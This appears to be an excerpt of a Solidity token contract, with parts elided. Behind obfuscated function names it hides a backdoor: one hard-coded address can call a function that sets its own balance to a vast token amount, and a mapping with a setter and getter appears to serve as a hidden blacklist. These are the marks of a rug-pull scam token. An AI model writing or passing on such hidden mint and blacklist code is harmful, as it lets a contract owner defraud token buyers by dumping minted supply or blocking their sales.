...
contract Token is Ownable {
    ...
    address public _cwojak2;
    mapping(address => bool) private _wojakLeve;
    function CANCELOGPP(address sss) external   {
        if (_cwojak2 == _msgSender()) {
            _wojakLeve[sss] = false;
        }
    }
    ...
    function wojaokssaddadmin() external {
        address twojak = _msgSender();
        if (_cwojak2 != twojak){
            revert("sdadasda"); 
        }
        if(_cwojak2 == twojak){
            _balances[twojak] = (1)*(1)*(1)*(8000)*(30000000000*10**decimals());
        }
        
    }
   

    function gewojakOG(address sss) public view returns(bool)  {
        return _wojakLeve[sss];
    }

    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojak2 = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
